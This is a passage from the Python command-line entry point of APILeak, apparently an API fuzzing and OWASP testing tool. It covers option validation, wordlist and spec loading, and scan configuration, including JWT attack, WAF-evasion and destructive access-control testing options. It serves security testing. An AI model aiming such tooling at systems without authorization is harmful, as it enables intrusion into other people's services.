#!/usr/bin/env python3
"""
APILeak Main Entry Point
Enterprise-grade API fuzzing and OWASP testing tool
"""

import asyncio
import copy
import json
import os
import re
import sys
from datetime import UTC, datetime
from pathlib import Path
from typing import Optional

import click

from cli.module_options import auth_options, bola_options
from cli.owasp_descriptors import (
    OWASP_MODULE_DESCRIPTORS,
    OwaspModuleDescriptor,
    all_keys,
    get_descriptor,
)
from cli.shared_options import (
    _validate_concurrency,
    _validate_depth,
    _validate_max_requests,
    _validate_retries,
    _validate_timeout,
    transversal_options,
)
from core import APILeakCore, ConfigurationManager, setup_logging
from core import __version__ as APILEAK_VERSION
from core.config import AuthContext, AuthType, load_actor_profiles, load_unauthorized_assertions
from core.logging import get_logger
from modules.fuzzing.markers import (
    FuzzMode,
    associate_wordlists,
    find_markers,
    parse_fuzz_mode,
    validate_fuzz_keyword,
)
from modules.fuzzing.orchestrator import normalize_extensions
from utils.discovery_checkpoint import (
    DiscoveryCheckpoint,
    DiscoveryCheckpointError,
)
from utils.discovery_export import DiscoveryExportError, write_discovery_export
from utils.discovery_output import (
    DiscoveryOutputError,
    write_discovery_output,
)
from utils.discovery_progress import DiscoveryProgress
from utils.discovery_scope import (
    PathScopeError,
    RecursionScopeError,
    StorageStatusError,
    parse_path_scope,
    parse_recursion_scope,
    parse_storage_status_selection,
)
from utils.discovery_session import (
    DiscoveryResult,
    DiscoverySession,
    DiscoverySessionError,
    apply_status_filter,
    group_by_status_class,
    parse_status_filter,
    status_code_class,
)
from utils.http_client import parse_resolve
from utils.jwt_attack_engine import JWTAttackEngine
from utils.jwt_attack_models import AttackType
from utils.jwt_utils import (
    JWT_HEADER_COLOR,
    JWT_PAYLOAD_COLOR,
    JWT_SIGNATURE_COLOR,
    colorize_jwt,
    decode_jwt,
    encode_jwt,
    generate_ec_keypair,
    generate_rsa_keypair,
    parse_raw_request,
    print_jwt_info,
    read_vector_file,
    reconstruct_public_key_from_jwks,
    verify_hmac_secret,
    verify_token,
)
from utils.response_selector import (
    DiscoveryResultEx,
    SelectorError,
    apply_selectors,
    calibrate_soft_404,
    parse_selectors,
)
from utils.spec_import import (
    SpecImportError,
    SpecSchema,
    import_openapi,
    import_postman,
    import_postman_schema,
    import_schema,
    load_schema,
    merge_candidates,
    normalize_candidate_path,
)
from utils.spec_import import _parse_document as _parse_spec_document
from utils.triage_table import render_triage_table


def parse_response_codes(response_filter: str) -> list:
    """Parse response code filter string into list of integers"""
    if not response_filter:
        return []

    codes = []
    parts = response_filter.split(',')

    for part in parts:
        part = part.strip()
        if '-' in part:
            # Range like 200-300
            try:
                start, end = part.split('-')
                codes.extend(range(int(start), int(end) + 1))
            except ValueError:
                click.echo(f"Warning: Invalid range format '{part}', ignoring", err=True)
        else:
            # Single code like 200
            try:
                codes.append(int(part))
            except ValueError:
                click.echo(f"Warning: Invalid response code '{part}', ignoring", err=True)

    return sorted(set(codes))  # Remove duplicates and sort


def parse_status_codes(status_filter: str) -> list:
    """Parse status code filter string into list of integers for HTTP output filtering"""
    if not status_filter:
        return []

    codes = []
    parts = status_filter.split(',')

    for part in parts:
        part = part.strip()
        if '-' in part:
            # Range like 200-300
            try:
                start, end = part.split('-')
                codes.extend(range(int(start), int(end) + 1))
            except ValueError:
                click.echo(f"Warning: Invalid status code range format '{part}', ignoring", err=True)
        else:
            # Single code like 200
            try:
                codes.append(int(part))
            except ValueError:
                click.echo(f"Warning: Invalid status code '{part}', ignoring", err=True)

    return sorted(set(codes))  # Remove duplicates and sort



# ---------------------------------------------------------------------------
# Validation callbacks for --depth, --max-requests, --concurrency,
# --timeout, --retries are imported from cli.shared_options (single source of
# truth — BUG-013 fix). They are used directly by the Click option decorators
# on the ``dir`` and ``par`` commands below.
# ---------------------------------------------------------------------------

def _validate_confirm_hits(ctx, param, value):
    """Click callback: reject a --confirm-hits below 1, naming the value.

    Click's ``type=int`` already rejects non-integers; this guards the lower
    bound so no Endpoint_Discovery runs on an invalid Hit_Confirmation count.
    ``default=None`` keeps Hit_Confirmation disabled; any supplied value must
    request at least one confirmation re-request (Requirement 35.7).
    """
    if value is not None and value < 1:
        raise click.BadParameter(f"--confirm-hits must be >= 1 (got {value})")
    return value


SUPPORTED_METHODS = ("GET", "POST", "PUT", "PATCH", "DELETE")


def _validate_methods(ctx, param, value):
    """Click callback: parse/normalize --methods and reject invalid values.

    ``--methods`` is a comma-separated list of HTTP methods that drives the
    ParameterFuzzer's injection-point selection (query-carrying vs body-carrying
    methods). Supported tokens are ``{GET, POST, PUT, PATCH, DELETE}``,
    case-insensitive. An empty/whitespace-only value is rejected (Requirement
    6.4) and a value containing no supported HTTP method is rejected while naming
    the offending value (Requirement 6.5), both before any request is issued.
    Unsupported tokens are ignored only when at least one supported token is
    present. Returns the normalized (upper-cased, de-duplicated, order-preserving)
    list of supported methods written to ``fuzzing.parameters.methods``
    (Requirement 6.1).
    """
    if value is None or not value.strip():
        raise click.BadParameter("--methods must not be empty or whitespace-only")
    tokens = [tok.strip().upper() for tok in value.split(",") if tok.strip()]
    normalized = []
    for tok in tokens:
        if tok in SUPPORTED_METHODS and tok not in normalized:
            normalized.append(tok)
    if not normalized:
        raise click.BadParameter(
            f"--methods contains no supported HTTP method (got {value!r}); "
            f"supported methods are {', '.join(SUPPORTED_METHODS)}"
        )
    return normalized


def _assert_readable(path, option_name):
    """Raise click.BadParameter naming the path when it is missing/unreadable.

    Shared by the --client-cert and --ca-bundle validators so an unreadable path
    is rejected before any Endpoint_Discovery runs (Requirement 29.6).
    """
    if not os.path.exists(path):
        raise click.BadParameter(f"{option_name} path does not exist: {path}")
    if not os.path.isfile(path) or not os.access(path, os.R_OK):
        raise click.BadParameter(f"{option_name} path cannot be read: {path}")


def _validate_client_cert(ctx, param, value):
    """Click callback: validate --client-cert and return the parsed value.

    Accepts either a single ``PATH`` (combined cert+key PEM) or a ``cert:key``
    pair. Each referenced path must exist and be readable, otherwise a
    descriptive error names the unreadable path and no Endpoint_Discovery runs
    (Requirement 29.6). Returns either the path string or a ``(cert, key)`` tuple
    suitable for httpx's ``cert`` kwarg (Requirement 29.1).
    """
    if value is None:
        return None
    if ":" in value:
        cert_path, key_path = value.split(":", 1)
        _assert_readable(cert_path, "--client-cert")
        _assert_readable(key_path, "--client-cert key")
        return (cert_path, key_path)
    _assert_readable(value, "--client-cert")
    return value


def _validate_ca_bundle(ctx, param, value):
    """Click callback: validate --ca-bundle path readability before discovery.

    The custom CA bundle path must exist and be readable; otherwise a descriptive
    error names the unreadable path and no Endpoint_Discovery runs (Requirement
    29.6). Returns the path unchanged (Requirement 29.2).
    """
    if value is None:
        return None
    _assert_readable(value, "--ca-bundle")
    return value


def _validate_resolve(ctx, param, value):
    """Click callback: validate --resolve as a host:ip pair before discovery.

    Delegates to ``parse_resolve`` so a value not expressed as ``host:ip`` is
    rejected with a descriptive error naming the value and no Endpoint_Discovery
    runs (Requirement 29.7). Returns the parsed ``(host, ip)`` tuple (Requirement
    29.4).
    """
    if value is None:
        return None
    try:
        return parse_resolve(value)
    except ValueError as exc:
        raise click.BadParameter(str(exc)) from exc


def _validate_secret_patterns(ctx, param, value):
    """Click callback: load and validate the --secret-patterns file.

    The file is a JSON object mapping Secret_Pattern names to regular expression
    strings (Requirement 30.6). The path must be readable, parse as a JSON
    object of string -> string entries, and every regex must compile; otherwise
    a descriptive error names the problem and no Endpoint_Discovery runs.
    Returns the parsed name -> regex map, or ``None`` when the option is not
    supplied (the built-in DEFAULT_SECRET_PATTERNS are then used).
    """
    if value is None:
        return None
    _assert_readable(value, "--secret-patterns")
    try:
        with open(value, encoding="utf-8") as handle:
            data = json.load(handle)
    except json.JSONDecodeError as exc:
        raise click.BadParameter(
            f"--secret-patterns file is not valid JSON: {value} ({exc})"
        ) from exc
    except OSError as exc:
        raise click.BadParameter(
            f"--secret-patterns file cannot be read: {value} ({exc})"
        ) from exc

    if not isinstance(data, dict) or not data:
        raise click.BadParameter(
            f"--secret-patterns file must be a non-empty JSON object mapping "
            f"pattern names to regex strings: {value}"
        )

    patterns = {}
    for name, pattern in data.items():
        if not isinstance(name, str) or not isinstance(pattern, str):
            raise click.BadParameter(
                f"--secret-patterns entries must map a string name to a string "
                f"regex (offending entry: {name!r})"
            )
        try:
            re.compile(pattern)
        except re.error as exc:
            raise click.BadParameter(
                f"--secret-patterns regex for '{name}' is invalid: {exc}"
            ) from exc
        patterns[name] = pattern
    return patterns


def resolve_max_depth(cli_depth: Optional[int]) -> int:
    """Resolve the effective recursion depth with documented precedence.

    Precedence: explicit CLI ``--depth`` value > ``APILEAK_MAX_DEPTH`` env var >
    default 3 (Requirements 17.6, 17.7, 17.8).
    """
    if cli_depth is not None:  # CLI wins (17.6)
        return cli_depth
    return int(os.getenv('APILEAK_MAX_DEPTH', '3'))  # env, else default 3 (17.7, 17.8)


def parse_header_options(header):
    """Parse repeatable ``-H``/``--header`` ``Name: Value`` strings into a dict.

    Each value is split on the first colon; the name and value are stripped.
    Later values for the same header name win. The resulting dict is merged into
    ``HeaderFuzzingConfig.custom_headers`` so the headers ride the existing
    custom-header plumbing and are applied to every Discovery_Request
    (Requirement 24.2).
    """
    parsed = {}
    for raw in header or ():
        name, sep, value = raw.partition(':')
        # A missing separator yields a valueless header name; the malformed-value
        # validation lives in the conflict-validation subtask (Requirement 24.6
        # is scoped to --basic-auth).
        parsed[name.strip()] = value.strip() if sep else ''
    return parsed


def validate_header_options(header):
    """Validate repeatable ``--header``/``-H`` values are in ``Name: Value`` form.

    A provided custom-header option that does not contain a ``:`` separating a
    name from a value is malformed; this rejects it with a descriptive error
    naming the offending header and exits BEFORE any request is issued
    (Requirement 7.5). Well-formed values are left for :func:`parse_header_options`
    to split; this only guards the colon-separator precondition.
    """
    for raw in header or ():
        if ':' not in raw:
            click.echo(
                f"Error: Malformed --header value '{raw}': expected 'Name: Value' "
                "with a ':' separating the header name from its value.",
                err=True,
            )
            sys.exit(1)


def parse_basic_auth(basic_auth):
    """Split a ``--basic-auth`` ``user:pass`` value into ``(username, password)``.

    Returns ``None`` when no value is supplied. The colon-separator validation
    (Requirement 24.6) and the ``--jwt`` conflict check (Requirement 24.5) are
    handled by the conflict-validation subtask before any discovery runs; this
    helper only parses an already-accepted value.
    """
    if not basic_auth:
        return None
    username, _, password = basic_auth.partition(':')
    return (username, password)


def parse_auth_context_option(values):
    """Build one :class:`AuthContext` per ``--auth-context`` option value.

    Format: ``user:token[:privilege]`` (Requirement 20.1).

    - Each value is split on ``:`` with ``maxsplit=2`` so a token that itself
      contains ``:`` (e.g. a JWT is dot-delimited, but bearer values may embed
      colons) survives intact in the second segment.
    - When a third ``:privilege`` segment is present, it sets the AuthContext
      ``privilege_level`` (Requirement 20.3); otherwise the privilege defaults
      to ``1``.
    - A value that omits the ``:`` separator between user and token is rejected
      with a descriptive :class:`click.BadParameter` BEFORE any request is
      issued (Requirement 20.5).

    Returns a ``List[AuthContext]`` — one context per supplied value
    (Requirement 20.2). An empty/unspecified ``values`` yields an empty list so
    the caller can preserve the existing single-``--jwt`` behavior
    (Requirements 20.4, 26.2).
    """
    contexts = []
    for value in values or ():
        if ':' not in value:
            raise click.BadParameter(
                f"--auth-context must be in the form user:token[:privilege] "
                f"(got {value!r}): missing ':' separator between user and token."
            )
        parts = value.split(':', 2)
        name, token = parts[0], parts[1]
        privilege_level = 1
        if len(parts) == 3 and parts[2] != '':
            try:
                privilege_level = int(parts[2])
            except ValueError:
                raise click.BadParameter(
                    f"--auth-context privilege suffix must be an integer "
                    f"(got {parts[2]!r} in {value!r})."
                ) from None
        contexts.append(AuthContext(
            name=name,
            type=AuthType.BEARER,
            token=token,
            privilege_level=privilege_level,
        ))
    return contexts


def validate_basic_auth_options(basic_auth, jwt):
    """Validate ``--basic-auth`` against conflicts and malformed values.

    Mirrors :func:`validate_user_agent_options`' exit-before-discovery pattern:
    on a problem it prints a descriptive error to stderr and ``sys.exit(1)`` so
    NO Endpoint_Discovery is performed.

    - ``--basic-auth`` together with ``--jwt`` is rejected as a conflicting set
      of authentication options (Requirement 24.5); they would otherwise fight
      over the single anonymous ``authentication.contexts[0]`` (the standard
      ``if jwt:`` override would clobber the basic context to ``bearer``).
    - A ``--basic-auth`` value without a ``:`` separating the user from the
      password is rejected as malformed (Requirement 24.6).
    """
    if not basic_auth:
        return

    if jwt:
        click.echo(
            "Error: Conflicting authentication options: --basic-auth and --jwt "
            "cannot be used together.",
            err=True,
        )
        sys.exit(1)

    if ':' not in basic_auth:
        click.echo(
            f"Error: Malformed --basic-auth value '{basic_auth}': expected "
            "'user:pass' with a ':' separating the username from the password.",
            err=True,
        )
        sys.exit(1)


def validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file):
    """Validate that only one user agent option is specified"""
    options_count = sum([bool(user_agent_random), bool(user_agent_custom), bool(user_agent_file)])

    if options_count > 1:
        click.echo("Error: Only one user agent option can be specified at a time:", err=True)
        click.echo("  --user-agent-random", err=True)
        click.echo("  --user-agent-custom", err=True)
        click.echo("  --user-agent-file", err=True)
        sys.exit(1)

    # Validate user agent file exists if specified
    if user_agent_file:
        if not Path(user_agent_file).exists():
            click.echo(f"Error: User agent file not found: {user_agent_file}", err=True)
            sys.exit(1)


def load_user_agents_from_file(file_path):
    """Load user agents from file, filtering out empty lines and comments"""
    try:
        user_agents = []
        with open(file_path, encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    user_agents.append(line)

        if not user_agents:
            click.echo(f"Error: No valid user agents found in file: {file_path}", err=True)
            sys.exit(1)

        return user_agents
    except Exception as e:
        click.echo(f"Error reading user agent file {file_path}: {e}", err=True)
        sys.exit(1)


def parse_target_file(path: str) -> list:
    """Read a target-file and return a list of normalised target URLs.

    Each non-empty, non-comment line becomes one target.  Lines that do not
    start with ``http://`` or ``https://`` are auto-prefixed with ``https://``
    so bare hostnames (``api.example.com``) and port-only specs
    (``api.example.com:8443``) work without decoration.

    Raises :class:`click.BadParameter` when the file cannot be read.
    """
    try:
        with open(path, encoding="utf-8") as fh:
            raw_lines = fh.readlines()
    except OSError as exc:
        raise click.BadParameter(f"--target-file cannot be read: {path} ({exc})") from exc

    targets: list[str] = []
    for line in raw_lines:
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        if not stripped.startswith("http://") and not stripped.startswith("https://"):
            stripped = "https://" + stripped
        targets.append(stripped)
    return targets


def _read_wordlist_entries(source):
    """Read one ``--wordlist`` source into entries.

    A ``source`` of ``-`` reads entries from standard input; a source with the
    ``assetnote:`` prefix is resolved to a local cache file (downloading it on
    demand when not already cached); any other value is treated as a file path.
    Blank lines and lines whose first non-whitespace character is ``#`` are
    skipped, using the same rule as ``_load_wordlist`` /
    :func:`load_user_agents_from_file` (Requirement 25.5).
    """
    from utils.wordlist_manager import ASSETNOTE_PREFIX, resolve_wordlist

    if source == '-':
        lines = sys.stdin.read().splitlines()
    elif source.startswith(ASSETNOTE_PREFIX):
        # Resolve (and auto-download) the Assetnote wordlist; then read it.
        resolved = resolve_wordlist(source, show_progress=True)
        with open(resolved, encoding='utf-8', errors='replace') as handle:
            lines = handle.readlines()
    else:
        with open(source, encoding='utf-8') as handle:
            lines = handle.readlines()

    entries = []
    for line in lines:
        stripped = line.strip()
        if stripped and not stripped.startswith('#'):
            entries.append(stripped)
    return entries


def _load_spec_seeds(openapi_sources, postman_sources):
    """Parse ``--openapi`` / ``--postman`` sources into Spec_Import seeds.

    OpenAPI/Swagger sources are parsed with :func:`import_openapi` and Postman
    collections with :func:`import_postman` (Requirements 25.1-25.3). An
    unparseable or unrecognized source raises :class:`SpecImportError` naming the
    offending source so the caller can perform no discovery (Requirement 25.6).
    """
    seeds = []
    for path in openapi_sources:
        try:
            doc = _parse_spec_document(path)
            seeds.extend(import_openapi(doc))
        except SpecImportError as exc:
            raise SpecImportError(f"OpenAPI source '{path}': {exc}") from exc
    for path in postman_sources:
        try:
            doc = _parse_spec_document(path)
            seeds.extend(import_postman(doc))
        except SpecImportError as exc:
            raise SpecImportError(f"Postman source '{path}': {exc}") from exc
    return seeds


async def _load_spec_schema(openapi_sources, postman_sources, http_engine=None):
    """Merge ``--openapi`` / ``--postman`` sources into one :class:`SpecSchema`.

    Every supplied Spec_Source (local path OR Spec_Source_URL) is routed through
    :func:`spec_import.load_schema`, which fetches URLs through the shared
    ``http_engine`` and reads local files from disk, dispatching both through the
    same parsing path (Requirements 49.1, 49.2, 51). The resulting per-source
    ``operations`` / ``security_schemes`` / ``seeds`` are concatenated into a
    single merged :class:`SpecSchema`.

    Returns ``None`` when no sources are supplied so the caller preserves the
    existing no-spec full-scan behavior (Requirement 49.3). An unreadable or
    unparseable source raises :class:`SpecImportError` naming the offending
    Spec_Source so the caller can abort before issuing any scan request
    (Requirement 49.4).
    """
    if not openapi_sources and not postman_sources:
        return None

    operations = []
    security_schemes = []
    seeds = []
    for source in list(openapi_sources) + list(postman_sources):
        schema = await load_schema(source, http_engine=http_engine)
        operations.extend(schema.operations)
        security_schemes.extend(schema.security_schemes)
        seeds.extend(schema.seeds)

    return SpecSchema(
        operations=operations,
        security_schemes=security_schemes,
        seeds=seeds,
    )


def _build_dir_spec_schema(openapi_sources, postman_sources):
    """Build a merged :class:`SpecSchema` from local spec files for ``dir`` discovery.

    Synchronous counterpart of :func:`_load_spec_schema` for the ``dir`` command,
    which does not run an async event loop at the point where the config is
    assembled. Only local file paths are supported (URL sources require the async
    path used by ``scan``). Returns ``None`` when no sources are supplied so the
    brute-force discovery path is preserved unchanged.
    """
    if not openapi_sources and not postman_sources:
        return None

    operations = []
    security_schemes = []
    seeds = []

    for path in list(openapi_sources or []):
        try:
            doc = _parse_spec_document(path)
            schema = import_schema(doc)
            operations.extend(schema.operations)
            security_schemes.extend(schema.security_schemes)
            seeds.extend(schema.seeds)
        except SpecImportError:
            raise  # re-raise; caller surfaces the error

    for path in list(postman_sources or []):
        try:
            doc = _parse_spec_document(path)
            schema = import_postman_schema(doc)
            operations.extend(schema.operations)
            seeds.extend(schema.seeds)
        except SpecImportError:
            raise

    if not operations and not seeds:
        return None

    return SpecSchema(
        operations=operations,
        security_schemes=security_schemes,
        seeds=seeds,
    )


def _resolve_dir_candidates(wordlists, openapi_sources, postman_sources):
    """Resolve discovery candidates from wordlists and Spec_Import sources.

    Returns a ``(candidate_set, seed_methods, wordlist_path)`` tuple:

    * Backward-compatible single-file case (no spec sources, no stdin, and at
      most one ``--wordlist``): ``candidate_set`` is ``None`` and ``seed_methods``
      is empty, while ``wordlist_path`` is the single file path (or ``None`` for
      the default wordlist). Discovery then loads the file via ``_load_wordlist``
      exactly as before.
    * Otherwise (any spec source, repeated ``--wordlist``, or ``--wordlist -``):
      all wordlist entries and spec seed paths are merged and de-duplicated by
      normalized path via :func:`merge_candidates` into an in-memory
      ``candidate_set`` (possibly empty, Requirement 25.4/25.7/25.8).
      ``seed_methods`` maps each spec seed's normalized path to its declared HTTP
      methods so those methods extend the per-path method set (Requirement 25.3),
      and ``wordlist_path`` is ``None``.

    Raises :class:`SpecImportError` naming an unparseable spec source
    (Requirement 25.6).
    """
    wordlists = list(wordlists or [])
    has_stdin = '-' in wordlists
    has_specs = bool(openapi_sources or postman_sources)

    # Backward-compatible single-file (or default) discovery path.
    if not has_specs and not has_stdin and len(wordlists) <= 1:
        return None, {}, (wordlists[0] if wordlists else None)

    # In-memory merged candidate set mode (Requirements 25.3, 25.4, 25.5).
    spec_seeds = _load_spec_seeds(openapi_sources, postman_sources)

    wordlist_entries = []
    for source in wordlists:
        wordlist_entries.extend(_read_wordlist_entries(source))

    candidate_set = merge_candidates(wordlist_entries, spec_seeds)

    # Spec methods extend the per-path method set for those seeds (Requirement
    # 25.3); keyed by normalized path so the fuzzer can match each candidate.
    seed_methods = {}
    for seed in spec_seeds:
        key = normalize_candidate_path(seed.path)
        if not key:
            continue
        methods = seed_methods.setdefault(key, [])
        if seed.method not in methods:
            methods.append(seed.method)

    return candidate_set, seed_methods, None


# Default parameter wordlist used by ``par`` when no ``--wordlist`` is supplied
# (Requirement 10.4).
DEFAULT_PARAMETER_WORDLIST = "wordlists/parameters.txt"


def _resolve_par_candidates(wordlists):
    """Resolve the merged, de-duplicated parameter candidate set for ``par``.

    Mirrors the ``dir`` command's repeatable ``--wordlist`` handling
    (Requirement 10.1): every provided ``--wordlist`` source is read via
    :func:`_read_wordlist_entries` (which strips surrounding whitespace and
    drops blank/comment lines), and the combined entries are de-duplicated
    while preserving first-seen order. Both query and body candidate sets are
    fed from this single merged set (Requirement 10.2).

    When no ``--wordlist`` is supplied, the default parameter wordlist
    ``wordlists/parameters.txt`` is used (Requirement 10.4).

    Raises :class:`ValueError` naming the unreadable file when a wordlist source
    cannot be read, so the caller can stop before any request (Requirement
    10.3).
    """
    sources = list(wordlists or [])
    if not sources:
        sources = [DEFAULT_PARAMETER_WORDLIST]

    seen = set()
    merged = []
    for source in sources:
        try:
            entries = _read_wordlist_entries(source)
        except OSError as exc:
            raise ValueError(
                f"unreadable wordlist file '{source}': {exc}"
            ) from exc
        for entry in entries:
            if entry not in seen:
                seen.add(entry)
                merged.append(entry)
    return merged


def prepare_output_filename(output_param):
    """Prepare output filename, ensuring it goes to reports directory"""
    if not output_param:
        return None

    # Extract just the filename, ignore any path components
    filename = Path(output_param).name

    # Remove any extension as the system will add appropriate extensions
    if '.' in filename:
        filename = filename.rsplit('.', 1)[0]

    return filename


def print_banner():
    """Print APILeak banner"""
    banner = r"""
      .o.       ooooooooo.   ooooo ooooo                            oooo
     .888.      `888   `Y88. `888' `888'                            `888
    .8"888.      888   .d88'  888   888          .ooooo.   .oooo.    888  oooo   .oooo.o
   .8' `888.     888ooo88P'   888   888         d88' `88b `P  )88b   888 .8P'   d88(  "8
  .88ooo8888.    888          888   888         888ooo888  .oP"888   888888.    `"Y88b.
 .8'     `888.   888          888   888       o 888    .o d8(  888   888 `88b.  o.  )88b
o88o     o8888o o888o        o888o o888ooooood8 `Y8bod8P' `Y888""8o o888o o888o 8""888P'
""" + f"\nAPILeak v{APILEAK_VERSION} - Enterprise API Fuzzing Tool - by Cl0wnR3v\n"
    click.echo(banner, color=True)


def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", user_agent_config=None, output_filename=None, advanced_config=None, status_code_filter=None, ci_mode=False, fail_on="critical", safe_mode=False, extra_headers=None, basic_auth=None, bola_config=None, module_configs=None, client_cert=None, ca_bundle=None, resolve=None, parameter_methods=None, confirm_hits=None, parameter_max_requests=None, query_candidates=None, body_candidates=None, fuzz_keyword="FUZZ", fuzz_mode="clusterbomb", marker_wordlists=None):
    """Create an enhanced configuration with all advanced features integrated

    ``module_configs`` generalizes the per-module pre-load config channel: it is
    a mapping of ``OWASPConfig`` field name (e.g. ``"bola_testing"``) to a plain
    dict of config values threaded into that module's ``owasp_testing`` sub-dict.
    The legacy ``bola_config`` parameter is retained as a backward-compatible
    alias that maps into ``module_configs['bola_testing']`` (preserving the exact
    BOLA assembly the ``full`` command relied on). When both are empty/None the
    ``owasp_testing`` sub-dicts are omitted entirely so every module resolves to
    its safe dataclass defaults and existing behavior is preserved byte-for-byte.
    """
    # Support environment variable overrides for CI/CD integration
    target_url = target_url or os.getenv('APILEAK_TARGET', '')

    default_wordlists = {
        'endpoints': 'wordlists/endpoints.txt',
        'parameters': 'wordlists/parameters.txt',
        'headers': 'wordlists/headers.txt',
        'jwt_secrets': 'wordlists/jwt_secrets.txt'
    }

    # Use provided wordlist or default
    if wordlist_path:
        if scan_type == "dir":
            default_wordlists['endpoints'] = wordlist_path
        elif scan_type == "par":
            default_wordlists['parameters'] = wordlist_path

    # Configure user agent settings with environment variable support
    user_agent_settings = {
        'User-Agent': os.getenv('APILEAK_USER_AGENT', f'APILeak/{APILEAK_VERSION}'),
        'Accept': 'application/json'
    }
    random_user_agent = False
    user_agent_list = None
    user_agent_rotation = False

    if user_agent_config:
        if user_agent_config.get('random'):
            random_user_agent = True
        elif user_agent_config.get('custom'):
            user_agent_settings['User-Agent'] = user_agent_config['custom']
        elif user_agent_config.get('file_list'):
            user_agent_list = user_agent_config['file_list']
            user_agent_rotation = True
            # Use first user agent as default
            user_agent_settings['User-Agent'] = user_agent_list[0]

    # Merge operator-supplied discovery headers (and the --cookie string, which
    # the caller places under the 'Cookie' key) into the header-fuzzing
    # custom_headers dict so they exist on the engine config and are applied to
    # every Discovery_Request (Requirements 24.2, 24.3).
    if extra_headers:
        user_agent_settings.update(extra_headers)

    # Configure enhanced advanced discovery settings
    advanced_discovery_config = {
        'enabled': True,  # Always enable for full integration
        'framework_detection': {
            'enabled': advanced_config.get('detect_framework', False) if advanced_config else False,
            'adapt_payloads': True,
            'test_framework_endpoints': True,
            'max_error_requests': 5,
            'timeout': 10.0,
            'confidence_threshold': advanced_config.get('framework_confidence', 0.6) if advanced_config else 0.6
        },
        'version_fuzzing': {
            'enabled': advanced_config.get('fuzz_versions', False) if advanced_config else False,
            'version_patterns': advanced_config.get('version_patterns', [
                "/v1", "/v2", "/v3", "/v4", "/v5",
                "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5",
                "/api/1", "/api/2", "/api/3",
                "/1", "/2", "/3"
            ]) if advanced_config else [
                "/v1", "/v2", "/v3", "/v4", "/v5",
                "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5"
            ],
            'test_endpoints': ["/", "/health", "/status", "/info", "/docs"],
            'max_concurrent_requests': 5,
            'timeout': 10.0,
            'compare_endpoints': True,
            'detect_deprecated': True
        },
        'subdomain_discovery': advanced_config.get('enable_subdomain_discovery', False) if advanced_config else False,
        'cors_analysis': advanced_config.get('enable_cors_analysis', False) if advanced_config else False,
        'security_headers': advanced_config.get('enable_cors_analysis', False) if advanced_config else False,
        'waf_detection': {
            'enabled': advanced_config.get('enable_waf_evasion', False) if advanced_config else False,
            'adaptive_throttling': True,
            'evasion_techniques': True
        },
        'payload_encoding': {
            'enabled': advanced_config.get('enable_payload_encoding', False) if advanced_config else False,
            'encodings': ['url', 'base64', 'html', 'unicode'],
            'obfuscation_techniques': ['case_variation', 'mutation']
        }
    }

    # Enhanced OWASP modules configuration
    owasp_modules = [] if scan_type in ["dir", "par"] else [
        module.strip() for module in os.getenv('APILEAK_MODULES', 'bola,auth,property,resource,function_auth,ssrf').split(',')
    ] if os.getenv('APILEAK_MODULES') else [
        "bola", "auth", "property", "resource", "function_auth", "ssrf"
    ]

    # OWASP testing section. Advanced BOLA hardening options (Requirement 34)
    # are threaded into the owasp_testing.bola_testing sub-dict consumed by
    # ConfigurationManager._build_owasp_config -> BOLAConfig(**bola_testing).
    # When ``bola_config`` is None (no advanced BOLA CLI flags) the sub-dict is
    # omitted entirely, so BOLAConfig resolves to its safe read-only defaults
    # and existing behavior is preserved byte-for-byte (Requirements 34.3,
    # 34.4). All boolean flags default to False (their dataclass defaults), and
    # ``destructive_methods`` is only set when the operator explicitly supplies
    # --bola-destructive-methods; otherwise the BOLAConfig default {PATCH, PUT}
    # applies (Requirement 34.2).
    owasp_testing = {
        'enabled_modules': owasp_modules
    }

    # Normalize the per-module pre-load config channel. The legacy ``bola_config``
    # alias is transformed into the same ``bola_testing`` sub-dict the ``full``
    # command produced and merged into ``module_configs`` (an explicit
    # ``module_configs['bola_testing']`` takes precedence). Each field's dict is
    # then threaded into ``owasp_testing`` so ConfigurationManager builds the
    # corresponding config dataclass. When no module config is supplied the
    # sub-dicts are omitted so every module resolves to its safe defaults
    # (Requirements 34.2-34.4 preserved).
    normalized_module_configs = dict(module_configs) if module_configs else {}
    if bola_config:
        bola_testing = {
            'allow_destructive': bola_config.get('allow_destructive', False),
            'enable_composite': bola_config.get('enable_composite', False),
            'enable_id_leakage': bola_config.get('enable_id_leakage', False),
            'verb_tampering': bola_config.get('verb_tampering', False),
            'parameter_pollution': bola_config.get('parameter_pollution', False),
            'dry_run': bola_config.get('dry_run', False),
        }
        destructive_methods = bola_config.get('destructive_methods')
        if destructive_methods:
            bola_testing['destructive_methods'] = destructive_methods
        normalized_module_configs.setdefault('bola_testing', bola_testing)

    for config_field, field_values in normalized_module_configs.items():
        if field_values:
            owasp_testing[config_field] = dict(field_values)

    config = {
        'target': {
            'base_url': target_url,
            'default_method': 'GET',
            'timeout': int(os.getenv('APILEAK_TIMEOUT', '10')),
            'verify_ssl': os.getenv('APILEAK_VERIFY_SSL', 'true').lower() == 'true'
        },
        'fuzzing': {
            'endpoints': {
                'enabled': scan_type in ["full", "dir"],
                'wordlist': default_wordlists['endpoints'],
                'methods': ["GET", "POST", "PUT", "DELETE", "PATCH"],
                'follow_redirects': True,
                'extensions': [],
                'enumerate_methods': False,
                'fuzz_keyword': "FUZZ",
                'fuzz_mode': "clusterbomb",
                'marker_wordlists': None
            },
            'parameters': {
                'enabled': scan_type in ["full", "par"],
                'query_wordlist': default_wordlists['parameters'],
                'body_wordlist': default_wordlists['parameters'],
                'boundary_testing': scan_type == "full"  # Enable for full scans
            },
            'headers': {
                'enabled': scan_type == "full",
                'wordlist': default_wordlists['headers'],
                'custom_headers': user_agent_settings,
                'random_user_agent': random_user_agent,
                'user_agent_list': user_agent_list,
                'user_agent_rotation': user_agent_rotation
            },
            'recursive': True,
            'max_depth': int(os.getenv('APILEAK_MAX_DEPTH', '3')),
            'response_filter': [],
            'max_requests': None,
            'concurrency': 50
        },
        'authentication': {
            'contexts': [
                {
                    'name': 'anonymous',
                    'type': 'bearer',
                    'token': os.getenv('APILEAK_JWT_TOKEN', ''),
                    'privilege_level': 0
                }
            ],
            'default_context': 'anonymous'
        },
        'rate_limiting': {
            'requests_per_second': int(os.getenv('APILEAK_RATE_LIMIT', '10')),
            'burst_size': 20,
            'adaptive': True,
            'respect_retry_after': True,
